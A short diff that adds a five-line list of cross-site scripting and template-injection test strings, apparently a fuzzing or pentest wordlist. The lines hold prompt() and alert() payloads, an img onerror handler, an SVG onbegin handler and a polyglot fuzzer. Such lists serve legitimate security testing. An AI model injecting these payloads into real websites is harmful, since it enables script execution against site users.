@@ -1,0 +1,5 @@
+"-prompt(69)-"
+'-prompt(69)-'
+<img src=1 onerror=alert(1)>
+"><svg><animatetransform onbegin=alert(1)>
+<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"fuzzer
